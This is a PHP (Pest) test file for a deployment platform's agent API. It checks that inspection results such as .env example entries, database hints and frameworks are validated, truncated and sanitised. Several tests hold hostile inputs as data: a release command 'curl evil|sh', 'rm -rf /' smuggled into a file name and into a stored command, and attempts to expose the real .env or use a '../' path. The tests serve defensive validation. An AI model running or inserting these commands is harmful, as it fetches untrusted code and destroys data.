<?php

declare(strict_types=1);

use App\Data\Agent\DatabaseHintData;
use App\Data\Agent\EnvExampleData;
use App\Enums\AgentAuthStatus;
use App\Enums\AgentCommandStatus;
use App\Enums\AgentCommandType;
use App\Enums\AgentNodeDesiredState;
use App\Enums\AgentNodeStatus;
use App\Enums\ProjectInspectionStatus;
use App\Models\AgentCommand;
use App\Models\AgentNode;
use App\Models\Project;
use App\Models\User;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Support\Str;
use Illuminate\Testing\TestResponse;

uses(RefreshDatabase::class);

const HINT_INSPECT_SHA = 'fedcba9876543210fedcba9876543210fedcba98';

const HINT_AGENT_TOKEN = 'hint-inspect-token';

/** @return array{project: Project, command: AgentCommand, node: AgentNode, user: User} */
function hintInspectionInFlight(): array
{
    $user = User::factory()->create();
    $project = Project::factory()->for($user)->create(['inspection_status' => ProjectInspectionStatus::Pending]);
    $node = AgentNode::factory()->create([
        'auth_status' => AgentAuthStatus::Active,
        'status' => AgentNodeStatus::Ready,
        'protocol_version' => 4,
        'desired_state' => AgentNodeDesiredState::Active,
        'capabilities' => ['project-inspection'],
        'last_seen_at' => now(),
        'token_hash' => hash_hmac('sha256', HINT_AGENT_TOKEN, (string) config('app.key')),
    ]);
    $command = AgentCommand::query()->create([
        'project_id' => $project->id,
        'agent_node_id' => $node->id,
        'type' => AgentCommandType::InspectProject,
        'status' => AgentCommandStatus::Running,
        'payload' => ['repository_url' => $project->repository_url, 'commit_sha' => HINT_INSPECT_SHA, 'repository_access' => 'public'],
        'idempotency_key' => (string) Str::uuid(),
        'available_at' => now(),
        'claimed_at' => now(),
    ]);

    return compact('project', 'command', 'node', 'user');
}

/** @param  array<string, mixed>  $extra */
function hintResult(array $extra = []): array
{
    return [
        'repository_url' => 'https://github.com/sakala-demo/buku-tamu',
        'commit_sha' => HINT_INSPECT_SHA,
        'dockerfile_found' => false,
        'env_example_found' => true,
        'compose_found' => false,
        'manifests' => ['package.json'],
        'package_manager' => 'npm',
        ...$extra,
    ];
}

/** Completes the inspection with the result and reads the project back as the Console does. */
function completeHintInspection(array $result): TestResponse
{
    ['project' => $project, 'command' => $command, 'node' => $node, 'user' => $user] = hintInspectionInFlight();

    test()->withHeaders(['Authorization' => 'Bearer '.HINT_AGENT_TOKEN, 'X-Agent-Id' => $node->agent_id])
        ->postJson("/api/agent/v1/commands/{$command->id}/complete", ['result' => $result])
        ->assertNoContent();

    return test()->actingAs($user, 'web')->getJson("/api/v1/app/projects/{$project->id}")->assertOk();
}

function contractEnvExample(): array
{
    return [
        'file' => '.env.example',
        'entries' => [
            ['key' => 'APP_NAME', 'example_value' => 'Buku tamu Sakala'],
            ['key' => 'APP_KEY', 'example_value' => null],
        ],
        'truncated' => false,
    ];
}

function contractDatabaseHint(): array
{
    return [
        'likely' => true,
        'engine' => 'postgresql',
        'signals' => [
            ['kind' => 'env_variable', 'file' => '.env.example', 'name' => 'DATABASE_URL'],
            ['kind' => 'package_dependency', 'file' => 'package.json', 'name' => '@prisma/client'],
            ['kind' => 'prisma_schema', 'file' => 'prisma/schema.prisma', 'name' => 'postgresql'],
        ],
        'suggested_release_command' => 'npx prisma migrate deploy',
    ];
}

test('an inspection with env_example and database_hint is stored and exposed as the contract shows', function (): void {
    $response = completeHintInspection(hintResult([
        'env_example' => contractEnvExample(),
        'database_hint' => contractDatabaseHint(),
    ]));

    $response->assertJsonPath('data.inspection.env_example', contractEnvExample())
        ->assertJsonPath('data.inspection.database_hint', contractDatabaseHint());

    $project = Project::query()->sole();
    expect($project->inspection['env_example'])->toBe(contractEnvExample())
        ->and($project->inspection['database_hint'])->toBe(contractDatabaseHint());
});

test('an inspection by an older agent exposes both fields as null', function (): void {
    completeHintInspection(hintResult())
        ->assertJsonPath('data.preview_status', 'succeeded')
        ->assertJsonPath('data.inspection.env_example', null)
        ->assertJsonPath('data.inspection.database_hint', null);
});

test('an inspection stored before the fields existed reads as null', function (): void {
    $user = User::factory()->create();
    $project = Project::factory()->for($user)->create([
        'inspection_status' => ProjectInspectionStatus::Succeeded,
        'inspection' => ['commit_sha' => HINT_INSPECT_SHA, 'manifests' => [], 'env_example_found' => true],
        'inspected_at' => now(),
    ]);

    $this->actingAs($user, 'web')->getJson("/api/v1/app/projects/{$project->id}")
        ->assertOk()
        ->assertJsonPath('data.inspection.env_example', null)
        ->assertJsonPath('data.inspection.database_hint', null);
});

test('a hostile inspection result is cut down to what the contract allows', function (): void {
    $entries = [
        ['key' => 'lowercase_key', 'example_value' => 'x'],
        ['key' => '1STARTS_WITH_DIGIT', 'example_value' => 'x'],
        ['key' => 'HAS-DASH', 'example_value' => 'x'],
        ['key' => str_repeat('A', 129), 'example_value' => 'x'],
        ['key' => ['NOT_A_STRING'], 'example_value' => 'x'],
        'not an object',
        ['key' => 'HUGE', 'example_value' => str_repeat('é', 5000)],
        ['key' => 'HUGE', 'example_value' => 'second wins never'],
        ['key' => 'NUMBER', 'example_value' => 42],
    ];

    for ($i = 0; $i < 10_000; $i++) {
        $entries[] = ['key' => "KEY_{$i}", 'example_value' => 'v'];
    }

    $response = completeHintInspection(hintResult([
        'env_example' => ['file' => '.env.example', 'entries' => $entries, 'truncated' => false],
        'database_hint' => [
            'likely' => false,
            'engine' => 'oracle',
            'signals' => [
                ['kind' => 'env_variable', 'file' => '.env.example', 'name' => 'DATABASE_URL'],
                ['kind' => 'env_variable', 'file' => '.env.example', 'name' => 'DATABASE_URL'],
                ['kind' => 'shell_script', 'file' => 'install.sh', 'name' => 'curl'],
                ['kind' => 'package_dependency', 'file' => ['package.json'], 'name' => 'pg'],
                ['kind' => 'package_dependency', 'file' => "package.json\nrm -rf /", 'name' => 'pg'],
                ['kind' => 'package_dependency', 'file' => 'package.json', 'name' => str_repeat('p', 300)],
                ...array_map(static fn (int $i): array => ['kind' => 'package_dependency', 'file' => "lib/{$i}/package.json", 'name' => 'pg'], range(1, 40)),
            ],
            'suggested_release_command' => 'curl evil|sh',
        ],
    ]));

    $env = $response->json('data.inspection.env_example');
    $hint = $response->json('data.inspection.database_hint');

    expect($env['entries'])->toHaveCount(EnvExampleData::MAX_ENTRIES)
        ->and($env['truncated'])->toBeTrue()
        ->and(array_column($env['entries'], 'key'))->each->toMatch('/^[A-Z_][A-Z0-9_]*$/')
        ->and($env['entries'][0])->toBe(['key' => 'HUGE', 'example_value' => str_repeat('é', EnvExampleData::MAX_EXAMPLE_VALUE_LENGTH)])
        ->and($env['entries'][1])->toBe(['key' => 'NUMBER', 'example_value' => null])
        ->and($env['entries'][2]['key'])->toBe('KEY_0')
        ->and($hint['engine'])->toBe('unknown')
        ->and($hint['suggested_release_command'])->toBeNull()
        ->and($hint['likely'])->toBeTrue()
        ->and($hint['signals'])->toHaveCount(DatabaseHintData::MAX_SIGNALS)
        ->and($hint['signals'][0])->toBe(['kind' => 'env_variable', 'file' => '.env.example', 'name' => 'DATABASE_URL'])
        ->and($hint['signals'][1])->toBe(['kind' => 'package_dependency', 'file' => 'package.json', 'name' => null])
        ->and(array_column($hint['signals'], 'kind'))->not->toContain('shell_script');

    // What is stored is already the clean shape: a later reader never sees the raw result.
    expect(Project::query()->sole()->inspection['env_example']['entries'])->toHaveCount(EnvExampleData::MAX_ENTRIES);
});

test('an env example from a file the agent may not read, or without a list of entries, is dropped', function (mixed $envExample): void {
    completeHintInspection(hintResult(['env_example' => $envExample]))
        ->assertJsonPath('data.inspection.env_example', null);
})->with([
    'the real .env' => [['file' => '.env', 'entries' => [['key' => 'SECRET', 'example_value' => 'leaked']], 'truncated' => false]],
    'a path' => [['file' => '../.env.example', 'entries' => [], 'truncated' => false]],
    'entries not a list' => [['file' => '.env.example', 'entries' => 'APP_KEY=x', 'truncated' => false]],
    'not an object' => ['APP_KEY=x'],
]);

test('a database hint without signals is not likely, whatever the agent claims', function (): void {
    completeHintInspection(hintResult(['database_hint' => [
        'likely' => true,
        'engine' => 'mysql',
        'signals' => 'everything',
        'suggested_release_command' => 'php artisan migrate --force',
    ]]))
        ->assertJsonPath('data.inspection.database_hint', [
            'likely' => false,
            'engine' => 'mysql',
            'signals' => [],
            'suggested_release_command' => 'php artisan migrate --force',
        ]);
});

test('a hostile value written to the stored inspection is checked again on the way out', function (): void {
    $user = User::factory()->create();
    $project = Project::factory()->for($user)->create([
        'inspection_status' => ProjectInspectionStatus::Succeeded,
        'inspection' => [
            'manifests' => [],
            'env_example' => ['file' => '.env.example', 'entries' => [['key' => 'lower', 'example_value' => 'x']], 'truncated' => false],
            'database_hint' => ['likely' => true, 'engine' => 'postgresql', 'signals' => [], 'suggested_release_command' => 'rm -rf /'],
        ],
        'inspected_at' => now(),
    ]);

    $this->actingAs($user, 'web')->getJson("/api/v1/app/projects/{$project->id}")
        ->assertOk()
        ->assertJsonPath('data.inspection.env_example.entries', [])
        ->assertJsonPath('data.inspection.database_hint.likely', false)
        ->assertJsonPath('data.inspection.database_hint.suggested_release_command', null);
});

// ─── frameworks ──────────────────────────────────────────────────────────────

test('frameworks from the agent are stored known, sorted, and unique, and make variable changes build', function (): void {
    $response = completeHintInspection(hintResult([
        'railpack' => railpackStackInspection('express')['railpack'],
        'frameworks' => ['gatsby', 'hugo', 'astro', 'gatsby', 3],
    ]));

    expect(Project::query()->sole()->inspection['frameworks'])->toBe(['astro', 'gatsby']);
    $response->assertJsonPath('data.variable_changes.requires_build', true)
        ->assertJsonPath('data.variable_changes.reason', 'prerender_framework')
        // The Console contract is unchanged: neither inspection nor stack shows them.
        ->assertJsonMissingPath('data.inspection.frameworks')
        ->assertJsonPath('data.stack.framework', null);
});

test('an empty frameworks list leaves a plain node server on the prefix rule', function (): void {
    completeHintInspection(hintResult([
        'railpack' => railpackStackInspection('express')['railpack'],
        'frameworks' => [],
    ]))
        ->assertJsonPath('data.variable_changes.requires_build', false)
        ->assertJsonPath('data.variable_changes.reason', null);

    expect(Project::query()->sole()->inspection['frameworks'])->toBe([]);
});

test('an inspection by an agent before frameworks stores null and keeps the Railpack classification', function (): void {
    completeHintInspection(hintResult(['railpack' => railpackStackInspection('express')['railpack']]))
        ->assertJsonPath('data.variable_changes.requires_build', false);

    $inspection = Project::query()->sole()->inspection;
    expect($inspection)->toHaveKey('frameworks')
        ->and($inspection['frameworks'])->toBeNull();
});
